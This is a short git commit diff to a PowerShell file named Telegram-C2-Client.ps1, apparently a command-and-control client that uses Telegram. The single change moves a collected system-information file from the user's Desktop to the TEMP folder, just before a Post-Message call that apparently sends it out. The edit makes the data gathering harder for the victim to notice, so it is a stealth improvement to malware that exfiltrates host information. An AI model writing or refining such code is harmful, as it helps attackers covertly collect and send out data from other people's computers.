12565ae68e5a935823caea35e1d75ed274b298b9
egieb <93350544+beigeworm@users.noreply.github.com>
2024-02-12 15:38:40 +0000

    Update Telegram-C2-Client.ps1

--- Telegram-C2-Client.ps1
+++ Telegram-C2-Client.ps1
@@ -665,7 +665,7 @@ $process
 
 =================================================================================================================================="
 
-$outpath = "$env:USERPROFILE/Desktop/systeminfo.txt"
+$outpath = "$env:TEMP/systeminfo.txt"
 $contents | Out-File -FilePath $outpath -Encoding ASCII -Append
 $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
 Post-Message
